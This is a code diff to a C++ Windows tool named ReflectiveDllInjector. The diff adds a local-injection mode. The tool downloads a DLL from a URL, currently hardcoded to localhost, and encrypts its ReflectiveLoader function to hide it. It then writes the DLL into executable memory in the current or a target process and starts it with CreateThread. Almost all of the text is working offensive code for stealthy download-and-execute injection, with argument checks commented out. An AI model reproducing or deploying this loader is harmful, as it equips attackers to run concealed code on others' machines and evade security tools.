@@ -30,7 +30,7 @@ struct iArgs {
 
     char* url;
     char* process;
-
+	bool isLocal;
 };
 
 wchar_t* GetWC(char* c)
@@ -80,10 +80,12 @@ void ToLowerCaseWIDE(WCHAR str[]) {
 
 iArgs argumentParser(int argc, char* argv[]) {
     iArgs args = { 0 };
-
+	args.isLocal = false;
     for (int i = 1; i < argc; ++i) {
         std::string arg = argv[i];
-
+		
+        
+        
         if (arg == "-url") {
             if (i + 1 < argc) {
                 args.url = argv[i + 1];
@@ -104,7 +106,10 @@ iArgs argumentParser(int argc, char* argv[]) {
                 // Handle error: "-process" option requires an argument
                 std::cerr << "[-] Error: -process option requires an argument." << std::endl;
             }
-        }
+		}
+		else if (arg == "-local") {
+			args.isLocal = true;
+		}
         else {
             // Handle unknown arguments or options here if needed
             std::cerr << "[!] Warning: Unknown argument '" << arg << "'. Ignored." << std::endl;
@@ -224,6 +229,19 @@ PBYTE InjectDllRemoteProcess(int pid, size_t dllSize, PBYTE dllBuffer, HANDLE hP
     }
     return dllDestination;
 
+}
+
+PBYTE InjectDllLocalProcess(size_t dllSize, PBYTE dllBuffer, size_t funcSize) {
+
+	PBYTE dllBufferFinal = (PBYTE)addHeaderToBuffer(dllBuffer, dllSize, funcSize);
+	PBYTE dllDestination = (PBYTE)VirtualAlloc(NULL, dllSize + DLL_HEADER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	if (dllDestination == NULL) {
+		cout << "[-] Error while allocating memory in local process, exiting ... " << endl;
+		return NULL;
+	}
+	memcpy(dllDestination, dllBufferFinal, dllSize + DLL_HEADER_SIZE);
+	return dllDestination;
 }
 
 
@@ -349,19 +367,21 @@ VOID encryptReflectiveFunction(PBYTE begin, SIZE_T functionSize) {
 int main(int argc, char *argv[])
 {
     iArgs arguments = argumentParser(argc, argv);
-
-    if (!(arguments.url != nullptr && *(arguments.url) != '\0') || !(arguments.process != nullptr && *(arguments.process) != '\0')) {
+    /*
+    if (!(arguments.url != nullptr && *(arguments.url) != '\0') || (!(arguments.process != nullptr && *(arguments.process) != '\0') && !arguments.isLocal)) {
         cerr << "[-] Error passing arguments to the function, forgetting something? Typo?\n";
-        cout << "[!] Correct example: ReflectiveDllInjector.exe -url ciaogrande.com -process chebello.exe\n";
+        cout << "[!] Correct example (1): ReflectiveDllInjector.exe -url ciaogrande.com -process chebello.exe\n";
+        cout << "[!] Correct example (2): ReflectiveDllInjector.exe -url ciaogrande.com -local\n";
         return 1;
     }
+    */
 
-    char* targetProcess = arguments.process;
-    printf("[+] Looking for process: %s\n", targetProcess);
+   
     /*--------DOWNLOAD DLL FROM URL------------*/
 
-	LPCSTR url = arguments.url;
-	vector<char> pefile = downloadFromURL(url);
+	//LPCSTR url = arguments.url;
+	LPCSTR url = "http://127.0.0.1/ReflectiveDLL.dll";
+    vector<char> pefile = downloadFromURL(url);
 	PBYTE pebase = (PBYTE)(pefile.data());
 
     if (pefile.size() == 0) {
@@ -369,7 +389,75 @@ int main(int argc, char *argv[])
         return 1;
     }
 
+	/*--------CHECK IF LOCAL OR REMOTE INJECTION------------*/ 
+
+	if (arguments.isLocal) {
+
+		//print the PID of the current process
+		DWORD pid = GetCurrentProcessId();
+		printf("[+] Current process PID: %lu\n", pid);
+
+        PBYTE reflectiveLoaderFunc = (PBYTE)RetrieveFunctionRawPointer(pebase, EXPORTED_FUNC_NAME);
+        if (reflectiveLoaderFunc == NULL) {
+            cout << "[-] Error while retrieving the RAW offset of the ReflectiveLoader function\n";
+            return 1;
+        }
+        printf("[+] ReflectiveLoader function found at relative raw address: %p\n", reflectiveLoaderFunc);
+
+        /*------------FINDING FUNCTION SIZE FOR ENCRYPTION-----------------*/
+        //here to keep in mind that both begin and end are RRA
+        PBYTE reflectiveLoaderFuncEnd = findFunctionEnd(pebase, reflectiveLoaderFunc);
+        int rfSize = (reflectiveLoaderFuncEnd - reflectiveLoaderFunc);
+        printf("[+] Size of Reflective Function (bytes): %lu\n", rfSize);
+
+        /*----------HIDING THE REFLECTIVE FUNCTION---------------------------*/
+
+        encryptReflectiveFunction(pebase + (DWORD)reflectiveLoaderFunc, (SIZE_T)rfSize);
+
+		/*--------ALLOCATE MEMORY, WRITE DLL TO LOCAL PROCESS--------------*/ 
+
+		PBYTE localPEBase = InjectDllLocalProcess(pefile.size(), pebase, (SIZE_T)rfSize);
+		if (localPEBase == NULL) {
+			cout << "[-] Error while injecting the DLL in the local process, exiting\n";
+			return 1;
+		}
+		printf("[+] Successfully injected the DLL in the local process at address : % p\n", localPEBase);
+        
+
+        /*-------------RETRIEVE PRELOADER RAW ADDRESS-------------*/
+        PBYTE reflectivePreLoaderFunc = (PBYTE)RetrieveFunctionRawPointer(pebase, EXPORTED_PRE_LOADER);
+        if (reflectivePreLoaderFunc == NULL) {
+            cout << "[-] Error while retrieving the RAW offset of the PreLoader function\n";
+            return 1;
+        }
+        printf("[+] PreLoader function found at relative raw address: %p\n", reflectivePreLoaderFunc);
+
+        /*--------CREATE LOCAL THREAD TO RUN THE FUNCTION-----------------*/
+
+		DWORD threadId = 0x0;
+		HANDLE hThread = NULL;
+		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(localPEBase + (DWORD)reflectivePreLoaderFunc + DLL_HEADER_SIZE), NULL, 0, &threadId);
+		if (hThread == NULL) {
+			cout << "[-] Error while running the local thread, exiting ... \n";
+		}
+		else {
+			printf("[+] Successufully ran thread with id: %lu\n", threadId);
+		}
+
+		//injection successful, waiting for user input to close the program
+		printf("[!] Input char to end the program\n");
+		getchar();
+		//WaitForSingleObject(hThread, INFINITE);
+		CloseHandle(hThread);
+
+
+		return 0;
+	}
+
     /*--------ENUMERATE PROCESS AND FIND TARGET-------*/
+
+    char* targetProcess = arguments.process;
+    printf("[+] Looking for process: %s\n", targetProcess);
 
     int pid = RetrievePIDbyName(GetWC(targetProcess));
     if (pid != 0) {
